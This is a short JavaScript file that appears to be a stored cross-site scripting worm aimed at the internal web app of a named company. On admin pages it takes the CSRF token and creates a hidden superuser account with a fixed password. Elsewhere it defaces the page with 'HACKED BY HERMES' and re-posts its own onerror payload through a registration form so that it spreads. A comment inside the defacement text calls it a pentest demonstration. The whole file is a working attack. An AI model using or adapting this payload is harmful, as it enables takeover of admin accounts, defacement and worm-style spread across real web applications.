let u=location.href;
if(u.includes('/admin/')){
  fetch('/admin/auth/user/add/').then(r=>r.text()).then(t=>{
    let m=t.match(/csrfmiddlewaretoken['"]?\s*value=['"]([^'"]+)/);
    if(!m){ document.body.innerHTML+='<p>admin: NO_CSRF</p>'; return; }
    let f=new FormData();
    f.append('csrfmiddlewaretoken',m[1]);
    f.append('username','hermesbreakthrough');
    f.append('password1','HermesBreak123!');
    f.append('password2','HermesBreak123!');
    f.append('is_superuser','on');
    f.append('is_staff','on');
    f.append('_save','Save');
    fetch('/admin/auth/user/add/',{method:'POST',body:f}).then(rr=>rr.text()).then(tt=>{
      document.body.innerHTML+='<p>admin: '+(tt.includes('hermesbreakthrough')?'CREATED':'NOT_CREATED')+'</p>';
    });
  });
} else {
  document.documentElement.innerHTML=`<head><title>HACKED BY HERMES</title><meta name='viewport' content='width=device-width,initial-scale=1'></head><body style='margin:0;font-family:sans-serif;background:#000;color:#0f0;text-align:center;padding-top:15vh'><h1 style='font-size:48px'>HACKED BY HERMES</h1><p id='w'>Sanindo Multi Tekno internal app has been compromised.</p><p>This is a non-destructive pentest demonstration.</p></body>`;
  let payload=document.querySelector('img[onerror]')?.getAttribute('onerror') || '';
  let email='worm'+Date.now()+'@example.com';
  let fd=new FormData();
  fd.append('participant_name','<img src=x onerror="'+payload.replace(/"/g,'\"')+'">');
  fd.append('participant_email',email);
  fd.append('participant_phone','08'+Date.now().toString().slice(-10));
  fd.append('participant_status','Karyawan');
  fetch('/cobareg/',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
    let uid=d.data?.uid||d.message||'none';
    document.getElementById('w').innerHTML='WORM: created new serial <b>'+uid+'</b>';
  }).catch(e=>document.getElementById('w').innerHTML='WORM ERR: '+e.message);
}